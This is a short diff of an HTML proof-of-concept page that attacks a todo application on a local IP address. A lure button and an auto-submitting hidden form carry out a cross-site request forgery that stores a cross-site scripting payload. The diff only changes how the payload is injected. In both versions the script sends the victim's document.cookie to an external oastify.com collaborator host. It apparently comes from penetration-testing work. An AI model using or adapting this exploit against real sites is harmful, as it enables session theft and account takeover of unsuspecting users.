@@ -2,12 +2,17 @@
 <html>
   <body>
     <form id="csrfForm" action="http://192.168.1.115:8080/Todos/test/list.php" method="POST">
-      <input type="hidden" name="Todo" value="<script>window.location.href = 'http://5gmyt5d1twwiopl6puuhh7rif9l09rxg.oastify.com?cookie=' + encodeURIComponent(document.cookie);
-</script>">
+      <!-- Place the script tag outside the value attribute -->
+      <input type="hidden" name="Todo" value="">
       <input type="hidden" name="Status" value="Destroyed">
       <input type="submit" name="submit" value="Click here to make CSK to win the finale!!!">
     </form>
+    <!-- Embed the JavaScript code inside a script tag -->
     <script>
+      // Set the value of the hidden input field to the JavaScript code
+      document.querySelector('input[name="Todo"]').value = 'window.location.href = "http://5gmyt5d1twwiopl6puuhh7rif9l09rxg.oastify.com?cookie=" + encodeURIComponent(document.cookie)';
+      
+      // Automatically submit the form after setting the value
       document.getElementById("csrfForm").submit();
     </script>
   </body>
